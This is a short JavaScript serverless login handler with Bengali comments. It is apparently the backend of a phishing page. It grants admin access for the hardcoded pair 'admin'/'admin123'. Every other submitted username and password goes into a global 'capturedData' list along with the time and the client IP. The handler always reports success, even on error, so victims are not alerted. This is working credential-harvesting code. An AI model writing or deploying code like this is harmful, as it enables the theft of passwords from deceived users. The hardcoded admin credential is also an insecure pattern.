// গ্লোবাল ভ্যারিয়েবল ডিক্লেয়ার (টেস্টিং এর জন্য)
if (!global.capturedData) {
  global.capturedData = [];
}

export default async function handler(req, res) {
  // CORS হ্যান্ডলিং (প্রয়োজনে)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== "POST") {
    return res.status(405).json({ success: false });
  }

  const { username, password } = req.body || {};

  if (!username || !password) {
    return res.status(400).json({ success: false });
  }

  // === ADMIN CHECK ===
  if (username === "admin" && password === "admin123") {
    return res.status(200).json({ 
      success: true, 
      isAdmin: true 
    });
  }

  // === NORMAL USER CAPTURE ===
  try {
    global.capturedData.push({
      username: username,
      password: password,
      time: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || "Unknown"
    });
    
    // সফলভাবে সেভ হলে success পাঠাবে
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    return res.status(200).json({ success: true }); // এরর হলেও ইউজারকে success দেখাবে
  }
}
